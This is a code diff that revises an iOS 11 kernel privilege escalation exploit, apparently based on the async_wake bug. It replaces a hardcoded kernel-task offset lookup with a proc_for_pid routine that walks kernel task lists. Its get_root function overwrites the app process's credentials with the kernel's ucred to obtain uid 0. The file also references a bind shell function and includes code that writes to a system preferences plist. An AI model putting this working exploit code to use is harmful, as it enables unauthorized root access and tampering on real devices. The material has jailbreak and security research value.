@@ -88,8 +88,6 @@ IOServiceOpen(
 /******** end extra headers ***************/
 
 mach_port_t user_client = MACH_PORT_NULL;
-uint64_t OFFSET_KERNEL_TASK = 0;
-uint64_t kt = 0;
 
 // make_dangling will drop an extra reference on port
 // this is the actual bug:
@@ -833,63 +831,62 @@ void bind_shell(char* env_path, int port) {
     free(shell_path);
 }
 
-// gets uid 0 (iOS 11)
-// add patchfinder and you should be good
-// Abraham Masri @cheesecakeufo
-// https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8
+// thx ianbeer for async_wake
+// proc_for_pid based on cheesecakeufo code
+// by stek29: https://gist.github.com/stek29/8b808986e7ee3c204bfb76d69577812f
 
-
-/*
- * Purpose: iterates over the procs and finds our proc
- */
-uint64_t get_our_proc() {
-    
+uint64_t proc_for_pid(uint32_t pid) {
     uint64_t task_self = task_self_addr();
     uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t next_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
     
-    
-    while (struct_task != 0) {
+    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
         uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        uint32_t found = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
         
-        // get the process pid
-        uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
-        
-        if(pid == getpid()) {
+        if (found == pid) {
             return bsd_info;
         }
         
         struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
     }
-    return -1; // we failed :/
-}
-
-uid_t get_root (uint64_t kernel_task) {
     
-    char* ret = "";
-    
-    uint64_t our_proc = get_our_proc();
-    
-    if(our_proc == -1) {
-        printf("[ERROR]: no our proc. wut\n");
-        return ret;
+    struct_task = next_task;
+    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
+        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+        uint32_t found = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+        
+        if (found == pid) {
+            return bsd_info;
+        }
+        
+        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
     }
     
-    printf("[INFO]: kernel_task: %llx\n", kernel_task); // BSD_INFO
-    
-    uint64_t kern_ucred = rk64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    printf("[INFO]: kern_ucred: %llx\n", kern_ucred);
-    
-    uint64_t offsetof_p_csflags = 0x2a8;
-    
-    uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
-    
-    uint64_t our_cred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    return -1;
+}
+
+
+uid_t get_root () {
     
     uid_t old = getuid();
     
-    wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
+    uint64_t our_proc = proc_for_pid(getpid());
+    printf("our proc: %llx\n", our_proc);
+    uint64_t kernel_proc = proc_for_pid(0);
+    printf("krn proc: %llx\n", kernel_proc);
     
+    if(our_proc == -1 || kernel_proc == -1) {
+        printf("[ERROR]: no our/krn proc. wut\n");
+        return getuid();
+    }
     
+    uint64_t krn_ucred = rk64(kernel_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    printf("krn_ucred: %llx\n", krn_ucred);
+    uint64_t our_ucred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
+    printf("our_ucred: %llx\n", our_ucred);
+    
+    wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, krn_ucred);
     printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
     setuid(0);
     printf("[INFO]: new uid: %d\n", getuid());
@@ -911,76 +908,58 @@ mach_port_t go() {
      
      We can now temporarily gain uid=0! I think we have to swap back to the old uid to prevent kernel panics though.
      
-     Here's how to do this on your phone:
-     - Find your OFFSET_KERNEL_TASK using this guide from uroboro: https://gist.github.com/uroboro/5b2b2b2aa1793132c4e91826ce844957
-     - Add your device to the u.machine comparisons (add an 'else if' with your device) and set the offset
-     - Check console to ensure the test file is written!
-     - GG uid=0.
-     
      Usage:
      - call get_root() and store the uid it returns.
      - do root stuff
      - setuid(old_uid)
      
      */
+
+    uid_t old = get_root();
+    // do root stuff below
     
-    struct utsname u = {0};
-    uname(&u);
     
-    if(strstr(u.machine, "iPhone8,4")){
-        OFFSET_KERNEL_TASK = 0xfffffff00760a048;
-    } else if(strstr(u.machine, "iPhone10,5")) {
-        OFFSET_KERNEL_TASK = 0xfffffff00767a048;
-    } else if(strstr(u.machine, "iPhone10,4")) {
-        OFFSET_KERNEL_TASK = 0xfffffff00767a048;
+    
+    /*
+     To change your resolution:
+     - Edit values in the .plist
+     - Change the boolean below to true
+     - Reboot
+     
+     You only have to do this once. BE CAREFUL, IT IS NOT MY FAULT IF YOU FUCK THIS UP
+     */
+    bool shouldChangeResolution = false;
+
+    if(shouldChangeResolution){
+        
+        char ch;
+        FILE *source, *target;
+        
+        char* path;
+        
+        asprintf(&path, "%s/com.apple.iokit.IOMobileGraphicsFamily.plist", bundle_path());
+        
+        source = fopen(path, "r");
+        
+        target = fopen("/var/mobile/Library/Preferences/com.apple.iokit.IOMobileGraphicsFamily.plist", "w");
+        
+        while( ( ch = fgetc(source) ) != EOF )
+            fputc(ch, target);
+        
+        printf("Resolution changed, please reboot.\n");
+        
+        fclose(source);
+        fclose(target);
+        
+    }
+
+    //set uid back
+    setuid(old);
+    
+    if (probably_have_correct_symbols()) {
+        printf("have symbols for this device, testing the kernel debugger...\n");
+        test_kdbg();
     }
     
-    if(OFFSET_KERNEL_TASK != 0){
-        kt = rk64(find_kernel_base() + (OFFSET_KERNEL_TASK-0xFFFFFFF007004000));
-        uid_t old = get_root(rk64(kt + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)));
-        // do root stuff
-        
-        /*
-         To change your resolution:
-         - Edit values in the .plist
-         - Change the boolean below to true
-         - Reboot
-         
-         You only have to do this once. BE CAREFUL, IT IS NOT MY FAULT IF YOU FUCK THIS UP
-         */
-        bool shouldChangeResolution = false;
-        
-        if(shouldChangeResolution){
-            
-            char ch;
-            FILE *source, *target;
-            
-            char* path;
-            
-            asprintf(&path, "%s/com.apple.iokit.IOMobileGraphicsFamily.plist", bundle_path());
-            
-            source = fopen(path, "r");
-            
-            target = fopen("/var/mobile/Library/Preferences/com.apple.iokit.IOMobileGraphicsFamily.plist", "w");
-            
-            while( ( ch = fgetc(source) ) != EOF )
-                fputc(ch, target);
-            
-            printf("Resolution changed, please reboot.\n");
-            
-            fclose(source);
-            fclose(target);
-            
-        }
-        
-        setuid(old);
-    }
-    
-    
-    
-  if (probably_have_correct_symbols()) {
-    printf("have symbols for this device, testing the kernel debugger...\n");
-    test_kdbg();
-  }
-  return tfp0;
+    return tfp0;
 }
